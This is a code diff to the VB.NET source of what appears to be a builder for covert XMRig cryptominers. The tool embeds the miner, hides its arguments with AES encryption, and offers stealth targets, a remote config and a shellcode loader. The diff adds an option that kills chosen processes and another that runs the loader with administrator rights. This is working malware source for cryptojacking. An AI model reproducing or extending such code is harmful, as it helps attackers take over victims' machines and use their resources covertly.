@@ -38,7 +38,7 @@ Public Class Form1
     Public SALT As String = Randomi(32)
     Public IV As String = Randomi(16)
 
-    Public Key = RandomString(32)
+    Public Key As String = RandomString(32)
 
     Public InjectionTarget As String()
     Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
@@ -85,7 +85,7 @@ Public Class Form1
                 Return
             End If
 
-            Dim argstr As String = " --cinit-find-x -B --algo=""" & algo & """" & If(FA.chkAdvanced.Checked, FA.txtAdvParam.Text, advancedParams) & " --url=" & txtPoolURL.Text & " --user=" & txtPoolUsername.Text & " --pass=" & txtPoolPassowrd.Text & " --cpu-max-threads-hint=" & txtMaxCPU.Text.Replace("%", "") & If(FA.chkRemoteConfig.Checked, " --cinit-remote-config=""" & Unamlib_Encrypt(FA.txtRemoteConfig.Text) & """", "") & " " & If(toggleEnableStealth.Checked, " --cinit-stealth-targets=""" & Unamlib_Encrypt(FA.txtStealthTargets.Text) & """", "") & " "
+            Dim argstr As String = " --cinit-find-x -B --algo=""" & algo & """" & If(FA.chkAdvanced.Checked, FA.txtAdvParam.Text, advancedParams) & " --url=" & txtPoolURL.Text & " --user=" & txtPoolUsername.Text & " --pass=" & txtPoolPassowrd.Text & " --cpu-max-threads-hint=" & txtMaxCPU.Text.Replace("%", "") & If(FA.chkRemoteConfig.Checked, " --cinit-remote-config=""" & Unamlib_Encrypt(FA.txtRemoteConfig.Text) & """", "") & " " & If(toggleEnableStealth.Checked, " --cinit-stealth-targets=""" & Unamlib_Encrypt(FA.txtStealthTargets.Text) & """", "") & " " & If(FA.toggleProcessKiller.Checked, " --cinit-kill-targets=""" & Unamlib_Encrypt(FA.txtKillTargers.Text) & """", "") & " "
 
             minerbuilder.Replace("#dll", Resources_dll)
             minerbuilder.Replace("#xmr", Resources_xmrig)
@@ -112,6 +112,10 @@ Public Class Form1
 
             If toggleEnableStealth.Checked Then
                 argstr += " --cinit-stealth "
+            End If
+
+            If FA.toggleProcessKiller.Checked Then
+                argstr += " --cinit-kill "
             End If
 
             minerbuilder.Replace("#ARGSTR", EncryptString(argstr))
@@ -164,7 +168,7 @@ Public Class Form1
                 Codedom.UninstallerCompiler(uninstallerpath & If(FA.toggleShellcode.Checked, "-payload.exe", ".exe"))
 
                 If FA.toggleShellcode.Checked Then
-                    Codedom.LoaderCompiler(uninstallerpath & ".exe", uninstallerpath & "-payload.exe", """""", Nothing, False, True)
+                    Codedom.LoaderCompiler(uninstallerpath & ".exe", uninstallerpath & "-payload.exe", """""", Nothing, False, FA.toggleAdministrator.Checked)
                     If Codedom.LoaderOK Then
                         Try
                             File.Delete(uninstallerpath & "-payload.exe")
@@ -257,7 +261,7 @@ Public Class Form1
     End Function
 
     Public Function EncryptString(ByVal input As String)
-        Return Convert.ToBase64String(AES_Encryptor(Encoding.ASCII.GetBytes(input)))
+        Return Convert.ToBase64String(AES_Encryptor(Encoding.UTF8.GetBytes(input)))
     End Function
 
     Public Function Randomi(ByVal length As Integer) As String
@@ -316,7 +320,7 @@ Public Class Form1
 
         While i < length
             buffer(i) = chars(rand.Next(0, clength))
-            Threading.Interlocked.Increment(i)
+            i += 1
         End While
 
         Return New String(buffer)
